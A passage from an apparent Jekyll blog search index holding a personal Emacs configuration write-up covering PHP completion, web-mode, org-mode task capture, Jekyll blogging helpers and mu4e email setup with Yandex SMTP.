to use auto-complet-mode or company-mode.   I believe if you want jump-to-definition to work, phpctags is required to generate ctags, though I haven’t been able to make it work properly.   I’m using company-mode, M-v and M-w from dumb-jump work good enough for now.   Need to touch .ac-php-conf-json in root directory of the project to have ac-php work properly.   Need to manually run ac-php-remake-tags-all to regenerate tags when source code changes.       (use-package cl-lib)     (use-package php-mode)     (use-package ac-php)     (use-package company-php)      (add-hook 'php-mode-hook       '(lambda ()         (superword-mode 1)         (ac-php-core-eldoc-setup) ;; enable eldoc         (make-local-variable 'company-backends)         (add-to-list 'company-backends 'company-ac-php-backend)))   WEB   I don’t work much on front-end development, I only have some minimal configuration here.   web-mode   As suggested by web-mode documentation, both add-to-list and web-mode-engines-alist are recommened. This enables web-mode for most web templates as well as blade template for Laravel framework.       (use-package web-mode)     (add-to-list 'auto-mode-alist '(\"\\\\.phtml\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.tpl\\\\.php\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.[agj]sp\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.as[cp]x\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.erb\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.mustache\\\\'\" . web-mode))     (add-to-list 'auto-mode-alist '(\"\\\\.djhtml\\\\'\" . web-mode))      (setq web-mode-engines-alist           '((\"php\"    . \"\\\\.phtml\\\\'\")             (\"blade\"  . \"\\\\.blade\\\\.\"))     )   CSS, Sass, and Less   Indent by 2 spaces when working with css files.       (use-package css-mode       :config       (setq css-indent-offset 2))   Don’t compile the current SCSS file every time I save.       (use-package scss-mode       :config       (setq scss-compile-at-save nil))   Install Less       (use-package less-css-mode)   Javascript   Indent javascripts by 2 spaces       (setq js-indent-level 2)   Terminal   Use multi-term for terminals and bind it to C-c t.       (use-package multi-term)     (global-set-key (kbd \"C-c t\") 'multi-term)   Set the default shell, I use zsh.       (setq multi-term-program \"/bin/zsh\")   Don’t use evil mode in terminal buffers.       (evil-set-initial-state 'term-mode 'emacs)   Org Mode   org-mode is luuuuuuuuuv. If you haven’t made your mind switching to emacs yet, click on the link and read about org-mode.       (use-package org       :diminish org-indent-mode)   Display preferences   I like to see an outline of pretty bullets instead of a list of asterisks.       (use-package org-bullets       :init       (add-hook 'org-mode-hook 'org-bullets-mode))   I like seeing a little downward-pointing arrow instead of the usual ellipsis (...) that org displays when there’s stuff under a header.       (setq org-ellipsis \"⤵\")   Use syntax highlighting in source blocks while editing.       (setq org-src-fontify-natively t)   Make TAB act as if it were issued in a buffer of the language’s major mode.       (setq org-src-tab-acts-natively t)   When editing a code snippet, use the current window rather than popping open a new one (which shows the same information).       (setq org-src-window-setup 'current-window)   Task and org-capture management   Store my org files in ~/Projects/org, the location of an index file (my main todo list), and archive finished tasks in ~/Projects/org/archive.org.       (setq org-directory \"~/Projects/org\")      (defun org-file-path (filename)       \"Return the absolute address of an org file, given its relative name.\"       (concat (file-name-as-directory org-directory) filename))      (setq org-index-file (org-file-path \"index.org\"))     (setq org-archive-location           (concat (org-file-path \"archive.org\") \"::* From %s\"))   Set the master todo file ~/Projects/org/index.org as the agenda file       (setq org-agenda-files (list org-index-file))   Hitting C-c C-x C-s will mark a todo as done and move it to an appropriate place in the archive.       (defun hrs/mark-done-and-archive ()       \"Mark the state of an org-mode item as DONE and archive it.\"       (interactive)       (org-todo 'done)       (org-archive-subtree))      (define-key org-mode-map (kbd \"C-c C-x C-s\") 'hrs/mark-done-and-archive)   Record the time that a todo was archived.       (setq org-log-done 'time)           Capturing tasks       Define a few common tasks as capture templates.               (setq org-capture-templates           '((\"n\" \"Notes\"             entry (file \"~/Projects/org/notes.org\")             \"* %?\\n\")              (\"t\" \"Todo\"              entry              (file+headline org-index-file \"New Tasks\")              \"* TODO %?\\n\")))   When I’m starting an Org capture template I’d like to begin in insert mode.    I’m opening it up in order to start typing something, so this skips a step.           (add-hook 'org-capture-mode-hook 'evil-insert-state)   Refiling according to the document’s hierarchy.           (setq org-refile-use-outline-path t)         (setq org-outline-path-complete-in-steps nil)      Keybindings   Bind a few handy keys.           (define-key global-map \"\\C-cl\" 'org-store-link)         (define-key global-map \"\\C-ca\" 'org-agenda)         (define-key global-map \"\\C-cs\" 'org-agenda-show)         (define-key global-map \"\\C-cc\" 'org-capture)   Hit C-c i to quickly open up my todo list.           (defun open-index-file ()           \"Open the master org TODO list.\"           (interactive)           (find-file org-index-file)           (flycheck-mode -1)           (end-of-buffer))          (global-set-key (kbd \"C-c i\") 'open-index-file)   Bind C-c n to quickly open up notes.           (defun open-note-file ()           \"Open the notes.\"           (interactive)           (find-file \"~/Projects/org/notes.org\")           (flycheck-mode -1)           (end-of-buffer))          (global-set-key (kbd \"C-c n\") 'open-note-file)   Hit M-n to quickly open up a capture template for a new todo.           (defun org-capture-todo ()           (interactive)           (org-capture :keys \"t\"))          (global-set-key (kbd \"M-n\") 'org-capture-todo)   Export   Use htmlize for exporting html file. Disable footer.       (use-package htmlize)     (setq org-html-postamble nil)   Blogging   Copied these from hrs’s config as I also blog with jekyll. You may need to modify some paths to have it working correctly for you.   I don’t yet want to introduce more key chords for blogging functionalities, use M-x to invoke these functions or bind your customized key chords as you like.       (defvar hrs/jekyll-posts-directory \"~/Projects/ragingscholar/_posts/\")     (defvar hrs/jekyll-post-extension \".md\")      (defun hrs/replace-whitespace-with-hyphens (s)       (replace-regexp-in-string \" \" \"-\" s))      (defun hrs/replace-nonalphanumeric-with-whitespace (s)       (replace-regexp-in-string \"[^A-Za-z0-9 ]\" \" \" s))      (defun hrs/remove-quotes (s)       (replace-regexp-in-string \"[\\'\\\"]\" \"\" s))      (defun hrs/replace-unusual-characters (title)       \"Remove quotes, downcase everything, and replace characters     that aren't alphanumeric with hyphens.\"       (hrs/replace-whitespace-with-hyphens        (s-trim         (downcase          (hrs/replace-nonalphanumeric-with-whitespace           (hrs/remove-quotes title))))))      (defun hrs/slug-for (title)       \"Given a blog post title, return a convenient URL slug.        Downcase letters and remove special characters.\"       (let ((slug (hrs/replace-unusual-characters title)))         (while (string-match \"--\" slug)           (setq slug (replace-regexp-in-string \"--\" \"-\" slug)))         slug))      (defun hrs/timestamped-slug-for (title)       \"Turn a string into a slug with a timestamp and title.\"       (concat (format-time-string \"%Y-%m-%d\")               \"-\"               (hrs/slug-for title)))      (defun hrs/jekyll-yaml-template (title)       \"Return the YAML header information appropriate for a blog        post. Include the title, the current date, the post layout,        and an empty list of tags.\"       (concat        \"---\\n\"        \"title: \" title \"\\n\"        \"date: \" (format-time-string \"%Y-%m-%d %H:%M:%S\") \"\\n\"        \"tags: []\\n\"        \"---\\n\\n\"))      (defun hrs/new-blog-post (title)       \"Create a new blog post in Jekyll.\"       (interactive \"sPost title: \")       (let ((post (concat hrs/jekyll-posts-directory                           (hrs/timestamped-slug-for title)                           hrs/jekyll-post-extension)))         (if (file-exists-p post)             (find-file post)           (find-file post)           (insert (hrs/jekyll-yaml-template title)))))   Email   I use mu4e to send and receive emails. To have the following configuration work correctly, you have to install mu with emacs support, then offlineimap as a service to receive and send emails. You can click on their names to refer to their documentation respectively, or you can checkout A COMPLETE GUIDE TO EMAIL IN EMACS USING MU AND MU4E for a specific walkthrough.   I use evil-mu4e to have a consistent vim keymapping experience when working with emails. You should change the path to the mail directory you set up with mu.       (use-package evil-mu4e)     (require 'evil-mu4e)      (setq mu4e-maildir \"~/Mail\")     (setq mu4e-confirm-quit nil)   Setting mu4e contexts, this is good when you have more than one email addresses.       (setq mu4e-contexts     `( ,(make-mu4e-context         :name \"Yandex\"         :match-func (lambda (msg) (when msg           (string-prefix-p \"/Yandex\" (mu4e-message-field msg :maildir))))         :vars '(           (user-mail-address . \"send@hailang.email\")           (mu4e-trash-folder . \"/Yandex/Trash\")           (mu4e-refile-folder . \"/Yandex/Archive\")           (mu4e-sent-folder . \"/Yandex/Sent\")           (mu4e-drafts-folder . \"/Yandex/Drafts\")           ))     ))   Reading Emails   Display sender’s email address along with their names.       (setq mu4e-view-show-addresses t)   Save attachments in my ~/Downloads directory, not my home directory. This works better on a Mac.       (setq mu4e-attachment-dir \"~/Downloads\")   Some html emails are hideous to read in emacs, this binds a h to open the email in your default browser.       (add-to-list 'mu4e-view-actions       '(\"html in browser\" . mu4e-action-view-in-browser)       t)   Composing Emails   Enable Org-style tables and list manipulation.       (add-hook 'message-mode-hook 'turn-on-orgtbl)     (add-hook 'message-mode-hook 'turn-on-orgstruct++)   Once I’ve sent an email, kill the associated buffer instead of just burying it.       (setq message-kill-buffer-on-exit t)   Sending Emails   Send email with sendmail.       (setq message-send-mail-function 'message-send-mail-with-sendmail)     (setq message-sendmail-f-is-evil 't)      (setq mu4e-sent-folder \"~/Mail/Yandex/Sent\"       mu4e-drafts-folder \"~/Mail/Yandex/Drafts\"       user-mail-address \"send@hailang.email\"       smtpmail-default-smtp-server \"smtp.yandex.com\"       smtpmail-smtp-server \"smtp.yandex.com\"       smtpmail-smtp-service 587)      (defvar my-mu4e-account-alist       '((\"Yandex\"         (mu4e-sent-folder \"/Yandex/Sent\")         (user-mail-address \"send@hailang.email\")         (smtpmail-smtp-user \"send@hailang.email\")         (smtpmail-local-domain \"yandex.com\")         (smtpmail-default-smtp-server \"smtp.yandex.com\")         (smtpmail-smtp-server \"smtp.yandex.com\")         (smtpmail-smtp-service 587)         )       ;; Include any other accounts here ...       ))      (defun my-mu4e-set-account ()       \"Set the account for composing a message.        This function is taken from:          https://www.djcbsoftware.nl/code/mu/mu4e/Multiple-accounts.html\"       (let* ((account         (if mu4e-compose-parent-message             (let ((maildir (mu4e-message-field mu4e-compose-parent-message :maildir)))         (string-match \"/\\\\(.*?\\\\)/\" maildir)         (match-string 1 maildir))           (completing-read (format \"Compose with account: (%s) \"                  (mapconcat #'(lambda (var) (car var))                 my-mu4e-account-alist \"/\"))                (mapcar #'(lambda (var) (car var)) my-mu4e-account-alist)                nil t nil nil (caar my-mu4e-account-alist))))        (account-vars (cdr (assoc account my-mu4e-account-alist))))         (if account-vars       (mapc #'(lambda (var)           (set (car var) (cadr var)))             account-vars)           (error \"No email account found\"))))     (add-hook 'mu4e-compose-pre-hook 'my-mu4e-set-account)   Org Integration   I use org-mu4e to store emails or search queries as links (org-store-link), insert links in any org document such as my todo list (org-store-link) and follow the link when I need to (evil-org-open-links).   Refer to this link for more customizations.       (require 'org-mu4e)     (setq org-mu4e-link-query-in-headers-mode nil)   Further On   I’ll keep tweaking this configuration as I continue to use this wonderful text editing system. Many of the functions and configs that I copied from the Internet need more experimenting before I can feel comfortable hacking, and I’ll need much more experience to have my own customizations and hacks.   If you are thinking about switching to emacs from vim yourself and like what you read, consider giving it a try for a few days to see if it works for you.   You can certainly try my configuration out even if you’ve never used vim before, though that would make evil-mode and its related keybinding settings less sensible. I would highly recommend learning the original emacs keybindings in this case.   Check back to this repository for updates if you liked it, have fun hacking around!  ","categories": [],
        "tags": ["Emacs"],
        "url": "http://localhost:4000/how-i-switched-from-vim-to-emacs/",
        "teaser":null}]
